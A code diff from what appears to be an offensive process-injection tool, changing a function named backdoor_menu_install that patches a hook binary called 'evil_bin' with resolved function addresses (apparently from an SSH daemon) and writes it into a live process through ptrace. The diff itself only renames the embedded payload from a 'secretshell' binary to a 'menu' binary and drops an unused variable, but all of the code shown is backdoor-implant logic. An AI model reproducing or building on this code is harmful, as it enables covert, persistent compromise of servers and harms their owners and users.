@@ -11,11 +11,12 @@
 #include <util.h>
 #include <ptrace.h>
 
-extern unsigned char hook_secretshell_bin[];
-extern int hook_secretshell_bin_len;
+extern unsigned char hook_menu_bin[];
+extern int hook_menu_bin_len;
 
 void backdoor_menu_install(inject_ctx *ctx) {
-	int i, j;
+	int i;
+
 	callcache_entry *callcache;
 	callcache_entry *entry;
 	u32 callcache_total;
@@ -23,8 +24,8 @@ void backdoor_menu_install(inject_ctx *ctx) {
 
 	u8 *evil_bin;
 
-	evil_bin = malloc(hook_secretshell_bin_len);
-	memcpy(evil_bin, hook_secretshell_bin, hook_secretshell_bin_len);
+	evil_bin = malloc(hook_menu_bin_len);
+	memcpy(evil_bin, hook_menu_bin, hook_menu_bin_len);
 
 	u64 child_set_env = sub_by_debugstr(ctx, "child_set_env: too many env vars");
 	info("child_set_env = 0x%llx", child_set_env);
@@ -36,9 +37,9 @@ void backdoor_menu_install(inject_ctx *ctx) {
 
 	info2("entering critical phase");
 
-	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0xc0cac01ac0debabe, process_input);
-	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0x1111111122222222, child_set_env);
-	patch_placeholder(evil_bin, hook_secretshell_bin_len, 0xc0debabe13371337, ctx->config_addr);
+	patch_placeholder(evil_bin, hook_menu_bin_len, 0xc0cac01ac0debabe, process_input);
+	patch_placeholder(evil_bin, hook_menu_bin_len, 0x1111111122222222, child_set_env);
+	patch_placeholder(evil_bin, hook_menu_bin_len, 0xc0debabe13371337, ctx->config_addr);
 
 	callcache = get_callcache();
 	callcache_total = get_callcachetotal();
@@ -57,7 +58,7 @@ void backdoor_menu_install(inject_ctx *ctx) {
 					0, 0
 				);
 
-				_poke(ctx->pid, hole_addr, evil_bin, hook_secretshell_bin_len);
+				_poke(ctx->pid, hole_addr, evil_bin, hook_menu_bin_len);
 				info("COPIED HOOK!");
 			}
 
